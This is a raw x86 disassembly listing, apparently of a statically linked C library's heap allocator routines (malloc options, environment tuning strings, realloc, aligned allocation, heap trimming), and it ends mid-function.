mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80a9518]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, 1
test eax, eax
js 0x805321d
mov eax, 0
test eax, eax
je 0x805320e
mov dword [esp], 0x80aa360
call section.
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
add eax, 5
cmp eax, 6
ja case.0x8053171.0
jmp dword [eax*4 + 0x8092da8]
cmp ebx, 0x50
ja 0x80531da
mov eax, dword [0x80aa388]
and eax, 2
test ebx, ebx
je 0x80531d3
lea edx, [ebx + 0xb]
cmp edx, 0xf
jbe 0x80531cc
and edx, 0xfffffff8
or edx, eax
or edx, 1
mov eax, 0x80aa360
mov dword [eax + 0x28], edx
mov eax, 0
test eax, eax
je 0x80531c0
mov dword [esp], 0x80aa360
call section.
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [0x80aa360], 0
jmp 0x80531b6
mov edx, eax
or edx, 0x11
jmp 0x8053199
mov edx, eax
or edx, 9
jmp 0x8053199
xor esi, esi
jmp case.0x8053171.0
mov dword [0x80a951c], ebx
jmp case.0x8053171.0
mov dword [0x80aa7f0], ebx
jmp case.0x8053171.0
cmp ebx, 0x80000
ja 0x80531da
mov dword [0x80aa7e8], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e4], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e0], ebx
jmp case.0x8053171.0
mov dword [0x80aa360], 1
jmp 0x805315a
call fcn.0804f290
jmp 0x8053141
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x7d
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov edx, dword [0x80aa7e4]
mov eax, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], esi
add eax, 0x490
call fcn.0804f5c0
test eax, eax
mov ebx, eax
je 0x804fb94
lea esi, [ebx + 0x10]
mov dword [ebx], esi
mov dword [esp], esi
call fcn.0804edc0
mov eax, dword [ebx + 8]
lea edx, [ebx + 0x488]
mov dword [esi + 0x474], eax
mov dword [esi + 0x470], eax
mov eax, ebx
mov ecx, dword [ebx + 8]
add dword [0x80aa828], ecx
and eax, 7
je 0x804fb7c
sub edx, eax
lea edx, [edx + 8]
lea eax, [ecx + ebx]
mov dword [esi + 0x54], edx
sub eax, edx
or eax, 1
mov dword [edx + 4], eax
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov edx, dword [0x80aa7e4]
mov eax, 0x490
call fcn.0804f5c0
mov ebx, eax
xor eax, eax
test ebx, ebx
jne 0x804fb45
jmp 0x804fb8c
push ebp
mov edx, 0x7e
mov ebp, esp
mov ecx, dword [var_sp_4h]
lea eax, [ecx + 0x5c]
mov esi, esi
mov dword [eax + 0xc], eax
mov dword [eax + 8], eax
add eax, 8
dec edx
jns 0x804edd0
cmp ecx, 0x80aa360
je 0x804ede8
or dword [ecx + 0x28], 2
mov eax, dword [ecx + 0x28]
and eax, 2
or eax, 0x49
mov dword [ecx + 0x28], eax
lea eax, [ecx + 0x5c]
mov dword [ecx + 0x54], eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x28
mov eax, dword [0x80a9518]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
test eax, eax
js 0x804f2b3
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov esi, 0
mov dword [0x80a9518], 0
call fcn.0804f250
test esi, esi
je 0x804f5b1
mov dword [var_sp_4h], 0
mov dword [esp], 0x80aa360
call section.
test esi, esi
mov dword [0x80aa7cc], 0x80aa360
je 0x804f5a2
mov dword [var_sp_4h], 0
mov dword [esp], 0x80aa810
call section.
mov eax, 0
test eax, eax
je 0x804f593
mov dword [var_sp_4h], 0x80aa360
mov dword [esp], 0
call section.
mov edx, 0x80a9004
test edx, edx
je 0x804f339
mov edx, dword [0x80a9004]
mov dword [var_sp_ch], edx
mov dword [var_sp_8h], fcn.0804f130
mov dword [var_sp_4h], fcn.0804f080
mov dword [esp], fcn.0804ef90
xor ebx, ebx
call fcn.080549c0
mov eax, dword [0x80a95f4]
mov dword [var_14h], eax
mov eax, dword [0x80aa840]
test eax, eax
je 0x804f38e
mov dword [var_10h], eax
lea eax, [var_10h]
call fcn.0804f1f0
test eax, eax
mov dword [var_18h], eax
jne 0x804f3c2
test ebx, ebx
je 0x804f38e
movzx eax, byte [ebx]
test al, al
jne 0x804f3aa
call fcn.0804fc60
mov eax, dword [0x80aa340]
test eax, eax
jne 0x804f3a6
mov dword [0x80a9518], 1
jmp 0x804f2a8
call eax
jmp 0x804f397
movsx eax, al
mov dword [esp], 0xfffffffb
sub eax, 0x30
mov dword [var_sp_4h], eax
call fcn.08053120
jmp 0x804f389
mov ecx, dword [var_18h]
xor edx, edx
movzx eax, byte [ecx]
test al, al
je 0x804f588
cmp al, 0x3d
je 0x804f3e6
mov edi, dword [var_18h]
inc edx
movzx eax, byte [edx + edi]
test al, al
je 0x804f3e6
cmp al, 0x3d
jne 0x804f3d6
cmp al, 0x3d
jne 0x804f36f
cmp edx, 8
je 0x804f531
ja 0x804f423
cmp edx, 6
jne 0x804f36f
mov esi, dword [var_18h]
mov edx, 0x8093462
mov eax, 6
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x804f36f
mov ebx, dword [var_18h]
add ebx, 7
jmp 0x804f36f
cmp edx, 9
je 0x804f4da
cmp edx, 0xf
jne 0x804f36f
mov esi, dword [var_14h]
test esi, esi
jne 0x804f36f
mov esi, dword [var_18h]
mov edx, 0x8092c74
mov eax, 0xf
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x804f4ab
mov esi, dword [var_18h]
mov edx, str.MMAP_THRESHOLD_
mov eax, 0xf
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x804f36f
mov eax, dword [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [var_sp_4h], 0
add eax, 0x10
mov dword [esp], eax
call fcn.080494c0
mov dword [esp], 0xfffffffd
mov dword [var_sp_4h], eax
call fcn.08053120
jmp 0x804f36f
mov eax, dword [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [var_sp_4h], 0
add eax, 0x10
mov dword [esp], eax
call fcn.080494c0
mov dword [esp], 0xffffffff
jmp 0x804f49d
mov edi, dword [var_14h]
test edi, edi
jne 0x804f36f
mov esi, dword [var_18h]
mov edx, str.MMAP_MAX_
mov eax, 9
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x804f36f
mov eax, dword [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [var_sp_4h], 0
add eax, 0xa
mov dword [esp], eax
call fcn.080494c0
mov dword [esp], 0xfffffffc
jmp 0x804f49d
mov eax, dword [var_14h]
test eax, eax
jne 0x804f36f
mov esi, dword [var_18h]
mov edx, str.TOP_PAD_
mov eax, 8
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x804f36f
mov eax, dword [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [var_sp_4h], 0
add eax, 9
mov dword [esp], eax
call fcn.080494c0
mov dword [esp], 0xfffffffe
jmp 0x804f49d
mov ecx, dword [var_18h]
movzx eax, byte [ecx]
jmp 0x804f3e6
mov dword [0x80aa34c], 0x80aa360
jmp 0x804f32a
mov dword [0x80aa810], 0
jmp 0x804f309
mov dword [0x80aa360], 0
jmp 0x804f2e3
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, eax
xor eax, eax
test bl, 7
jne 0x804fde2
mov edx, dword [0x80aa808]
lea esi, [ebx - 8]
cmp esi, edx
jb 0x804fe37
mov edi, edx
add edi, dword [0x80aa7d0]
cmp esi, edi
jae 0x804fe37
mov ecx, dword [esi + 4]
test cl, 2
jne 0x804fde0
mov eax, ecx
and eax, 0xfffffff8
mov dword [var_10h], eax
add eax, esi
cmp eax, edi
jae 0x804fde0
cmp dword [var_10h], 0xf
jbe 0x804fde0
mov eax, dword [var_10h]
test byte [eax + esi + 4], 1
je 0x804fde0
and ecx, 1
jne 0x804fded
mov eax, dword [ebx - 8]
test al, 7
jne 0x804fde0
mov ecx, esi
sub ecx, eax
cmp ecx, edx
jl 0x804fde0
mov eax, dword [ecx + 4]
and eax, 0xfffffff8
lea eax, [eax + ecx]
cmp eax, esi
je 0x804fded
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
add dword [var_10h], 3
mov edx, esi
mov eax, esi
mov ecx, dword [var_10h]
shr eax, 0xb
shr edx, 3
xor edx, eax
movzx edx, dl
movzx eax, byte [ecx + esi]
movzx ecx, al
cmp ecx, edx
je 0x804fe2b
test ecx, ecx
je 0x804fde0
lea eax, [ecx + 8]
cmp dword [var_10h], eax
jb 0x804fde0
sub dword [var_10h], ecx
mov ecx, dword [var_10h]
movzx eax, byte [ecx + esi]
movzx ecx, al
cmp ecx, edx
jne 0x804fe0e
mov edx, dword [var_10h]
not eax
mov byte [edx + esi], al
mov eax, esi
jmp 0x804fde2
call fcn.080546b0
lea ecx, [eax - 1]
mov eax, ebx
and eax, ecx
cmp eax, 8
je 0x804fe90
test eax, eax
je 0x804fe90
cmp eax, 0x10
je 0x804fe90
cmp eax, 0x20
je 0x804fe90
cmp eax, 0x40
je 0x804fe90
cmp eax, 0x80
je 0x804fe90
cmp eax, 0x100
je 0x804fe90
cmp eax, 0x200
je 0x804fe90
cmp eax, 0x400
je 0x804fe90
cmp eax, 0x800
je 0x804fe90
cmp eax, 0x1000
je 0x804fe90
cmp eax, 0x1fff
jbe 0x804fde0
mov edx, dword [esi + 4]
mov eax, edx
and eax, 3
cmp eax, 2
jne 0x804fde0
mov ebx, dword [esi]
mov eax, esi
sub eax, ebx
test ecx, eax
jne 0x804fde0
and edx, 0xfffffff8
lea eax, [edx + ebx]
mov dword [var_10h], edx
test ecx, eax
jne 0x804fde0
dec dword [var_10h]
mov edx, esi
mov eax, esi
mov ecx, dword [var_10h]
shr eax, 0xb
shr edx, 3
xor edx, eax
movzx edx, dl
movzx eax, byte [ecx + esi]
movzx ecx, al
cmp ecx, edx
je 0x804fe2b
test ecx, ecx
je 0x804fde0
lea eax, [ecx + 8]
cmp dword [var_10h], eax
jb 0x804fde0
sub dword [var_10h], ecx
mov ecx, dword [var_10h]
movzx eax, byte [ecx + esi]
movzx ecx, al
cmp ecx, edx
jne 0x804fee4
jmp 0x804fe2b
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x14
mov ecx, dword [ebx + 4]
mov edi, dword [ebx]
mov eax, dword [0x80aa7f8]
mov dword [var_ch], 1
lea edx, [edi + edx]
and ecx, 0xfffffff8
sub ebx, edi
dec eax
add ecx, edi
mov dword [esp], ebx
lea esi, [eax + edx + 4]
mov dword [var_10h], ecx
mov dword [var_4h], ecx
not eax
and esi, eax
mov dword [var_8h], esi
call fcn.080548a0
xor edx, edx
cmp eax, 0xffffffff
je 0x8050fc9
lea ebx, [edi + eax]
mov eax, esi
sub eax, edi
or eax, 2
mov dword [ebx + 4], eax
mov edx, dword [0x80aa800]
mov eax, dword [0x80aa7fc]
sub eax, dword [var_10h]
add eax, esi
cmp eax, edx
mov dword [0x80aa7fc], eax
cmova edx, eax
mov dword [0x80aa800], edx
mov edx, ebx
add esp, 0x14
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [eax + 4]
dec dword [0x80aa7ec]
and ecx, 0xfffffff8
mov edx, ecx
add edx, dword [eax]
sub dword [0x80aa7fc], edx
mov edx, dword [eax]
add ecx, edx
sub eax, edx
mov dword [var_sp_4h], ecx
mov dword [esp], eax
call fcn.08054780
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x80528cc
test ebx, ebx
je 0x80528b7
cmp eax, 0xffffffdf
ja 0x80528a5
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
lea eax, [ebx - 8]
cmovb edx, dword [var_14h]
mov ecx, dword [eax + 4]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov edx, ecx
and edx, 0xfffffff8
test cl, 2
mov dword [var_1ch], edx
jne 0x80527c5
mov eax, dword [var_14h]
mov edi, edx
cmp edx, eax
jae 0x8052630
mov esi, dword [var_18h]
add esi, edx
mov edx, dword [var_10h]
cmp esi, dword [edx + 0x54]
je 0x8052777
mov eax, dword [esi + 4]
and eax, 0xfffffff8
test byte [eax + esi + 4], 1
jne 0x80526c0
mov edi, dword [var_1ch]
add edi, eax
cmp edi, dword [var_14h]
jb 0x80526c0
mov edx, dword [esi + 8]
mov eax, dword [esi + 0xc]
cmp dword [edx + 0xc], esi
jne 0x805261a
cmp dword [eax + 8], esi
je 0x8052627
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
lea esi, [esi]
mov ebx, edi
sub ebx, dword [var_14h]
cmp ebx, 0xf
ja 0x8052669
mov eax, ecx
and eax, 7
or eax, edi
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
or dword [edi + edx + 4], 1
mov eax, dword [var_18h]
add eax, 8
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, dword [var_18h]
add edx, dword [var_14h]
and eax, 7
or eax, dword [var_14h]
mov ecx, eax
or ecx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov ecx, dword [var_18h]
mov dword [ecx + 4], eax
mov ecx, ebx
mov eax, ebx
or eax, 1
or ecx, 5
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov dword [edx + 4], eax
or dword [ebx + edx + 4], 1
add edx, 8
mov dword [var_4h], edx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
jmp 0x805265b
lea esi, [esi]
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
mov dword [var_24h], eax
mov edx, dword [var_24h]
xor eax, eax
test edx, edx
je 0x8052661
mov eax, dword [var_24h]
sub eax, 8
mov edi, dword [eax + 4]
mov dword [var_20h], eax
and edi, 0xfffffff8
cmp eax, esi
je 0x8052769
mov ecx, dword [var_1ch]
sub ecx, 4
shr ecx, 2
cmp ecx, 9
jbe 0x8052721
cld
mov edi, dword [var_24h]
mov esi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_4h], ebx
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08052220
mov eax, dword [var_20h]
jmp 0x805265e
mov eax, dword [ebx]
mov edx, dword [var_24h]
cmp ecx, 4
mov dword [edx], eax
mov eax, dword [ebx + 4]
mov dword [edx + 4], eax
mov eax, dword [ebx + 8]
mov dword [edx + 8], eax
jbe 0x805270a
mov eax, dword [ebx + 0xc]
cmp ecx, 6
mov dword [edx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [edx + 0x10], eax
jbe 0x805270a
mov eax, dword [ebx + 0x14]
cmp ecx, 8
mov dword [edx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [edx + 0x18], eax
jbe 0x805270a
mov eax, dword [ebx + 0x1c]
mov dword [edx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [edx + 0x20], eax
jmp 0x805270a
mov edx, dword [var_18h]
add edi, dword [var_1ch]
mov ecx, dword [edx + 4]
jmp 0x8052630
mov eax, dword [esi + 4]
and eax, 0xfffffff8
add edi, eax
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jb 0x80526c0
mov eax, ecx
mov ecx, dword [var_18h]
and eax, 7
or eax, dword [var_14h]
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
sub edi, dword [var_14h]
mov edx, dword [var_10h]
mov dword [ecx + 4], eax
mov eax, ecx
add eax, dword [var_14h]
or edi, 1
mov dword [edx + 0x54], eax
mov dword [eax + 4], edi
mov eax, ebx
jmp 0x8052661
mov esi, dword [ebx - 8]
mov eax, dword [0x80aa7f8]
mov edx, dword [var_14h]
dec eax
add edx, esi
lea edi, [eax + edx + 4]
not eax
and edi, eax
mov eax, ebx
mov edx, edi
sub edx, esi
cmp dword [var_1ch], edx
mov dword [var_28h], edx
je 0x8052661
mov dword [var_ch], 1
mov dword [var_8h], edi
mov eax, dword [var_1ch]
add eax, esi
mov dword [var_4h], eax
sub dword [var_18h], esi
mov ecx, dword [var_18h]
mov dword [esp], ecx
call fcn.080548a0
cmp eax, 0xffffffff
je 0x8052849
or dword [var_28h], 2
add eax, esi
mov edx, dword [var_28h]
mov dword [var_20h], eax
mov dword [eax + 4], edx
mov eax, dword [0x80aa800]
mov edx, edi
sub edx, dword [var_1ch]
add edx, dword [0x80aa7fc]
cmp edx, eax
mov dword [0x80aa7fc], edx
cmova eax, edx
mov dword [0x80aa800], eax
jmp 0x8052719
mov eax, dword [var_14h]
mov dword [var_24h], ebx
add eax, 4
cmp dword [var_1ch], eax
jb 0x805285f
mov eax, dword [var_24h]
jmp 0x8052661
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
test eax, eax
mov dword [var_24h], eax
je 0x8052857
mov eax, dword [var_1ch]
mov dword [var_4h], ebx
sub eax, 8
mov dword [var_8h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08053770
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x8052857
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8052661
mov ecx, dword [var_10h]
mov dword [arg_ch], eax
mov dword [arg_8h], ecx
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x80528b0
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
cmp ebx, 8
mov dword [var_10h], eax
jbe 0x8052a85
cmp ebx, 0xf
mov eax, 0x10
cmovbe ebx, eax
lea eax, [ebx - 1]
test eax, ebx
je 0x8052928
mov eax, 0x10
cmp eax, ebx
jae 0x8052926
lea esi, [esi]
add eax, eax
cmp eax, ebx
jb 0x8052920
mov ebx, eax
cmp edx, 0xffffffdf
ja 0x8052a73
lea eax, [edx + 0xb]
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
lea eax, [ebx + edx + 0x10]
mov dword [var_14h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08051cf0
mov edi, eax
xor eax, eax
test edi, edi
je 0x80529b8
lea eax, [edi - 8]
xor edx, edx
mov dword [var_18h], eax
mov eax, edi
div ebx
test edx, edx
je 0x8052a0e
mov edx, ebx
lea eax, [ebx + edi - 1]
neg edx
and eax, edx
lea esi, [eax - 8]
mov eax, esi
lea edx, [ebx + esi]
sub eax, dword [var_18h]
cmp eax, 0xf
cmovbe esi, edx
mov edx, dword [var_18h]
mov ebx, esi
sub ebx, dword [var_18h]
mov eax, dword [edx + 4]
mov ecx, eax
and ecx, 0xfffffff8
sub ecx, ebx
test al, 2
je 0x80529c0
add ebx, dword [edi - 8]
or ecx, 2
lea eax, [esi + 8]
mov dword [esi + 4], ecx
mov dword [esi], ebx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, ecx
or edx, 5
or eax, 1
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [esi + 4], eax
or dword [ecx + esi + 4], 1
mov eax, dword [edx + 4]
and eax, 7
or eax, ebx
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
mov dword [var_4h], edi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov dword [var_18h], esi
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
test al, 2
jne 0x8052a68
mov edx, eax
mov eax, dword [var_14h]
and edx, 0xfffffff8
add eax, 0x10
cmp edx, eax
jbe 0x8052a68
mov eax, edx
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, dword [var_14h]
mov edx, eax
or eax, 5
or edx, 1
cmp dword [var_10h], 0x80aa360
cmovne edx, eax
mov dword [ecx + 4], edx
add ecx, 8
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
and eax, 7
or eax, dword [var_14h]
mov dword [edx + 4], eax
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov eax, dword [var_18h]
add eax, 8
jmp 0x80529b8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x80529b8
mov dword [arg_ch], edx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052d5f
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [0x80aa7f8]
mov dword [var_sp_4h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d42
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052daa
mov ecx, dword [0x80aa7f8]
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov edx, ecx
lea eax, [ecx + eax - 1]
mov dword [var_sp_4h], ecx
neg edx
and eax, edx
mov dword [var_8h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d82
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_ch], 3
mov dword [var_4h], eax
mov eax, dword [arg_14h]
mov dword [var_10h], eax
lea eax, [var_4h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_18h]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_14h], edx
mov edx, dword [arg_14h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
je 0x8052d21
test ebx, ebx
je 0x8052cd5
mov esi, dword [var_14h]
mov eax, ebx
test esi, esi
je 0x8052c4e
mov dword [var_2ch], ebx
mov dword [var_28h], 0
test byte [var_1ch], 1
je 0x8052c91
mov edx, dword [var_18h]
mov dword [var_20h], 0x10
mov eax, dword [edx]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, dword [var_14h]
cmovb edx, dword [var_20h]
imul eax, edx
mov dword [var_20h], edx
mov dword [var_24h], eax
mov eax, dword [var_24h]
mov edx, dword [var_28h]
mov ebx, dword [0x80aa7f0]
mov dword [0x80aa7f0], 0
lea ecx, [edx + eax - 7]
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051cf0
mov dword [0x80aa7f0], ebx
mov edx, eax
xor eax, eax
test edx, edx
je 0x8052c4e
lea ebx, [edx - 8]
mov edi, dword [ebx + 4]
and edi, 0xfffffff8
test byte [var_1ch], 2
jne 0x8052c70
xor eax, eax
mov ecx, dword [var_2ch]
cmp dword [var_10h], 0x80aa360
setne al
test ecx, ecx
lea edx, [eax*4 + 1]
mov dword [var_30h], edx
je 0x8052c56
mov eax, dword [var_14h]
xor esi, esi
dec eax
mov dword [var_34h], eax
cmp esi, dword [var_34h]
mov edx, dword [var_2ch]
lea eax, [ebx + 8]
mov dword [edx + esi*4], eax
je 0x8052c42
mov ecx, dword [var_20h]
test ecx, ecx
jne 0x8052c33
mov edx, dword [var_18h]
mov ecx, 0x10
mov eax, dword [edx + esi*4]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovae ecx, edx
mov eax, dword [var_30h]
sub edi, ecx
inc esi
or eax, ecx
mov dword [ebx + 4], eax
add ebx, ecx
jmp 0x8052c05
or dword [var_30h], edi
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_24h]
sub edi, dword [var_24h]
or edi, dword [var_30h]
lea eax, [edx + ebx]
lea edx, [eax + 8]
mov dword [eax + 4], edi
mov dword [var_2ch], edx
mov edi, dword [var_24h]
jmp 0x8052bfc
mov eax, edi
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], 0
sub eax, 4
mov dword [var_8h], eax
call fcn.080536f0
jmp 0x8052bdf
xor esi, esi
mov dword [var_20h], 0
mov dword [var_24h], 0
cmp esi, dword [var_14h]
je 0x8052b91
lea esi, [esi]
mov edx, dword [var_18h]
mov eax, dword [edx + esi*4]
add eax, 0xb
cmp eax, 0xf
jbe 0x8052ccf
and eax, 0xfffffff8
add dword [var_24h], eax
inc esi
cmp esi, dword [var_14h]
jne 0x8052cb0
jmp 0x8052b91
add dword [var_24h], 0x10
jmp 0x8052cc4
mov ebx, dword [var_14h]
test ebx, ebx
je 0x8052d08
mov edx, dword [var_14h]
mov dword [var_28h], 0x10
mov dword [var_2ch], 0
lea eax, [edx*4 + 0xb]
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_28h]
mov dword [var_28h], edx
jmp 0x8052b60
mov edx, dword [var_10h]
mov dword [arg_ch], 0
mov dword [arg_8h], edx
add esp, 0x34
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [esp], eax
call fcn.08052430
jmp 0x8052b41
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08050e70
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov edx, dword [var_ch_3]
mov dword [var_8h_2], ebx
mov dword [var_4h_3], edi
mov dword [var_4h_2], esi
mov edi, dword [0x80aa7f8]
mov eax, dword [edx + 0x54]
xor edx, edx
mov esi, dword [eax + 4]
and esi, 0xfffffff8
mov eax, esi
sub eax, dword [var_sp_8h]
lea eax, [edi + eax - 0x11]
div edi
lea ebx, [eax - 1]
imul ebx, edi
test ebx, ebx
jle 0x8050ec3
mov dword [esp], 0
call dword [0x80a9508]
mov ecx, dword [var_ch_3]
mov edi, eax
mov eax, dword [ecx + 0x54]
add eax, esi
cmp edi, eax
je 0x8050ed0
xor eax, eax
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
mov edi, dword [var_4h_3]
leave
ret
neg ebx
mov dword [esp], ebx
call dword [0x80a9508]
mov eax, dword [0x80aa348]
test eax, eax
jne 0x8050f16
mov dword [esp], 0
call dword [0x80a9508]
test eax, eax
je 0x8050ec3
mov edx, edi
sub edx, eax
je 0x8050ec3
mov eax, dword [var_ch_3]
sub esi, edx
or esi, 1
sub dword [eax + 0x470], edx
mov eax, dword [eax + 0x54]
mov dword [eax + 4], esi
mov eax, 1
jmp 0x8050ec5
call eax
jmp 0x8050ee4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_ch]
mov eax, dword [eax + 0x54]
test eax, eax
mov dword [var_50h], eax
je 0x8052f3a
mov eax, dword [var_50h]
mov esi, 1
mov dword [var_44h], 0
mov dword [var_40h], 0
xor ebx, ebx
mov edi, dword [eax + 4]
and edi, 0xfffffff8
mov eax, dword [arg_ch]
mov edx, dword [eax + ebx*4 + 0x2c]
test edx, edx
je 0x8052e76
mov eax, dword [edx + 4]
inc dword [var_44h]
mov edx, dword [edx + 8]
and eax, 0xfffffff8
add dword [var_40h], eax
test edx, edx
jne 0x8052e63
inc ebx
cmp ebx, 9
jbe 0x8052e58
mov ecx, dword [arg_ch]
add edi, dword [var_40h]
mov ebx, 1
add ecx, 0x5c
lea esi, [esi]
mov edx, dword [ecx + 0xc]
cmp edx, ecx
je 0x8052ea7
mov eax, dword [edx + 4]
